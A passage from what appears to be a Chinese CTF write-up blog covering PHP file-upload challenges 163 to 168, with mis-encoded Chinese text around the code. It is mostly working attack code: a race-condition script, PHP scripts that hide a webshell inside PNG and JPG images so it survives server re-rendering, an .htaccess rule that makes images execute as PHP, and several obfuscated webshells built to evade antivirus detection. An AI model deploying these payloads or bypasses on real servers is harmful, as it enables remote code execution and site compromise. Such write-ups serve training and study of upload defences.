punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">)</span><span class="token punctuation">,</span>           threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>163</strong></p><p>åŒä¸Š</p><p><strong>164</strong></p><p>pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“</p><pre class="line-numbers language-none"><code class="language-none">åœ¨phpä¸­åŒ…å«éœ€è¦æ¸²æŸ“çš„ä»£ç æ—¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥ç”¨å¤§ä½¬è„šæœ¬ç”Ÿæˆä¸€å¼ å›¾ç‰‡å’¯</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img &#x3D; imagecreatetruecolor(32, 32);for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;   $r &#x3D; $p[$y];   $g &#x3D; $p[$y+1];   $b &#x3D; $p[$y+2];   $color &#x3D; imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y &#x2F; 3), 0, $color);&#125;imagepng($img,&#39;kkk.png&#39;);  &#x2F;&#x2F;è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„&#x2F;*æœ¨é©¬å†…å®¹&lt;?$_GET[0]($_POST[1]);?&gt;*&#x2F;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>165</strong></p><p>jpgå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system('tac f*');?>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>ç”¨æ³•  php exp.php a.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>166</strong></p><p>x-zip-compressed</p><p><strong>167</strong></p><p>æç¤ºä¸­ä¸ºhttpdï¼Œè‚¯å®šä¸apacheæœ‰å…³ï¼Œå°è¯•è§£ææ¼æ´ï¼Œä¸Šä¼ shell.php.xxxå‘ç°æ‰§è¡Œå¤±è´¥ï¼Œå°è¯•ä¸Šä¼ .htaccess</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;png&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;æˆ–è€…AddType application&#x2F;x-httpd-php .png   &#x2F;&#x2F;å°†.pngåç¼€çš„æ–‡ä»¶è§£æ æˆphp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OK</p><p><strong>168</strong></p><p>æ„é€ å…æ€æœ¨é©¬</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a &#x3D; &quot;s#y#s#t#e#m&quot;;$b &#x3D; explode(&quot;#&quot;,$a);$c &#x3D; $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];$c($_REQUEST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;substr(&#39;1s&#39;,1).&#39;ystem&#39;;$a($_REQUEST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;strrev(&#39;metsys&#39;);$a($_REQUEST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php$a&#x3D;$_REQUEST[&#39;a&#39;];$b&#x3D;$_REQUEST[&#39;b&#39;];$a($b);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" 